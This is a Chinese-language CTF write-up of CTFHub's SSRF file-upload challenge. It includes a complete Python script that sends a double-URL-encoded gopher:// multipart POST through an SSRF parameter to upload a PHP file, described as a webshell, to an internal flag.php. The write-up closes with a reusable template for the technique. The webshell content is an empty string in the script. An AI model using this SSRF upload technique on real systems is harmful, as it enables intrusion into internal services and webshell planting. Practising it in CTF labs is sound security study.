【CTFHub】Web-SSRF上传文件 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, SSRF, 上传文件, Gopher协议, multipart/form-data, Python脚本

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SSRF / 上传文件
  • 题目名称：上传文件
  • 环境：VS Code + Python 环境。
  • 目标：利用 SSRF 漏洞，通过 Gopher 协议构造 multipart/form-data 格式的 POST 请求，向内网 flag.php 上传 Webshell 文件，获取 Flag。

2. 解题思路与知识点

本关核心考点：利用 Gopher 协议发送 multipart/form-data 格式的文件上传 POST 请求。

知识点拆解：
  • multipart/form-data 格式：HTTP 协议中用于文件上传的编码方式。它需要一个 boundary（边界字符串）来分隔表单的各个字段。报文头需要声明 Content-Disposition 和 filename，且换行符要求极其严格（必须是 \r\n）。
  • 双重 URL 编码：Gopher 协议的数据包会被中间件解码一次，如果只编码一次，特殊字符（如 :, /, _）会导致 URL 参数截断。因此必须对 HTTP 报文进行一次编码后，再对整个 Gopher URL 进行第二次编码。
  • Content-Length 动态计算：必须精确计算 POST Body 的字节长度，否则 HTTP 服务器会截断请求体，导致上传失败（400 Bad Request 或请求被丢弃）。

3. 详细步骤

第一步：获取源码信息，确认上传格式

操作： 在浏览器访问 ?url=http://127.0.0.1/flag.php，右键查看页面源代码。

回显结果：发现表单代码：<form action="/flag.php" method="post" enctype="multipart/form-data"><input type="file" name="file"></form>。

获得信息：确认请求方式为 POST，编码类型为 multipart/form-data，表单字段名为 file。

第二步：编写 Python 脚本构造上传 Payload

脚本代码：

import requests
import urllib.parse
import re

# 1. 靶场根地址（注意末尾不要有斜杠）
base_url = "http://challenge-ad5f8faf3352964a.sandbox.ctfhub.com:10800"

# 2. 定义 boundary（边界字符串，用于分隔表单字段）
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

# 3. 构造要上传的文件内容（Webshell）
file_content = ""

# 4. 构造 multipart/form-data 格式的 POST Body
# 注意：HTTP协议严格规定，每一行末尾必须是 \r\n
post_body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
    "Content-Type: text/plain\r\n"
    "\r\n"
    f"{file_content}\r\n"
    f"--{boundary}--\r\n"
)

# 5. 构造完整的原始 HTTP POST 报文
raw_request = (
    "POST /flag.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(post_body)}\r\n"
    "Connection: close\r\n"
    "\r\n"
    f"{post_body}"
)

# 6. 第一次 URL 编码（Python的 quote 会自动将 \r\n 转义为 %0D%0A，绝不能手动 replace）
encoded_http = urllib.parse.quote(raw_request)

# 7. 拼接 Gopher 协议
gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"

# 8. 对整个 Gopher URL 进行第二次 URL 编码（关键，防止参数截断）
final_payload = urllib.parse.quote(gopher_payload)

# 9. 发送请求，直接拼接 URL（避开 requests 库自动编码干扰）
attack_url = f"{base_url}/?url={final_payload}"
print("[*] 正在向靶场发送 Webshell 上传攻击请求...")

try:
    r = requests.get(attack_url, timeout=10)
    # 10. 精准提取 Flag
    match = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
    if match:
        print("\n[+] 成功获取 Flag！")
        print(f"[+] {match.group(0)}")
    else:
        print("[-] 未提取到 Flag，原始回显如下：")
        print(r.text[:500])
except Exception as e:
    print("[-] 请求出现异常：", e)

代码逐行解析：

  • import requests, urllib.parse, re：导入网络请求模块、URL 编码模块和正则表达式模块。
  • base_url = "..."：靶场的根地址，脚本会自动拼接 ?url= 参数。
  • boundary = "..."：定义 multipart 表单的边界分隔符，格式任意，不冲突即可。
  • post_body = (...)：严格按照 multipart 协议拼装 Body。开头和结尾必须包含 --{boundary}。中间包含 Content-Disposition: form-data; name="file"; filename="test.php"，声明表单字段名为 file，文件名为 test.php。所有换行符必须为 \r\n，绝不能省略或使用 \n。
  • raw_request = (...)：构造原始 HTTP 报文。包含请求行、Host、Content-Type（此处需显式声明 boundary）、Content-Length（使用 len(post_body) 动态计算，确保长度准确无误）、Connection: close。
  • urllib.parse.quote(raw_request)：第一次 URL 编码。将 HTTP 报文中的特殊字符（如空格转 %20，\r\n 转 %0D%0A）进行 URL 编码。Python 的 quote 会自动处理换行符，绝对禁止手动 replace，否则会破坏换行结构导致 400 错误。
  • gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"：拼接 Gopher 协议头。Gopher 协议通过 _ 后面拼接经过编码的 TCP 数据流。
  • urllib.parse.quote(gopher_payload)：第二次 URL 编码。因为 Gopher URL 是作为 ?url= 参数的值进行传递的，如果直接发送，其中的 :、/、_ 等特殊字符会被服务器或浏览器截断，导致请求失败。对整个 URL 再次编码，能确保 Payload 完整送达。
  • requests.get(attack_url)：直接拼接 URL 发送请求。
  • re.search(r'ctfhub\{[a-f0-9]+\}', r.text)：用正则表达式从 HTML 响应中精准提取纯净的 Flag 字符串，避免复制到无关的 HTML 标签。

第三步：执行脚本获取 Flag

执行操作：在 VS Code 终端中运行脚本。

回显结果：终端打印出 [+] ctfhub{efe9be349dc8f7620f391e96}。

获得信息：Gopher 协议上传文件成功，提交 Flag 通关。

4. 踩坑记录与复盘

  • 坑1：手动 replace 导致 400 Bad Request。 在第一次 urllib.parse.quote() 编码后，尝试手动执行 encoded_http.replace("%0A", "%0D%0A")。由于 quote 已经自动将 \r\n 编码为 %0D%0A，再次替换会将其破坏为 %0D%0D%0A。畸形的换行符导致 HTTP 报文分界失效，Apache 服务器直接返回 400 Bad Request。正确的做法是信任 Python 的 quote 函数，绝不多此一举。
  • 坑2：Content-Length 未动态计算。 在 multipart 格式中，Body 长度必须通过 len(post_body) 精确计算。如果写死长度，服务器会认为请求体被截断，导致上传的数据不完整，验证失败。
  • 坑3：双重 URL 编码的必要性。 如果只对 HTTP 报文编码，Gopher URL 中的冒号和斜杠会被 ?url= 截断，导致 SSRF 请求无法正确转发到内网。必须对整个 Gopher 字符串进行二次编码。

5. 知识总结

  • Gopher 协议构造文件上传的通用模板： 构造 multipart/form-data Body -> 拼装 HTTP 报文 -> 第一次 URL 编码 -> 拼接 Gopher URL -> 第二次 URL 编码。
  • Python 编码处理原则： urllib.parse.quote() 自动处理 \r\n 转 %0D%0A、空格转 %20，写脚本时不要画蛇添足手动替换。
  • 脚本编写规范： 使用正则提取 Flag、动态计算 Content-Length、双重编码，是 SSRF Gopher 攻击的标准化脚本写法。
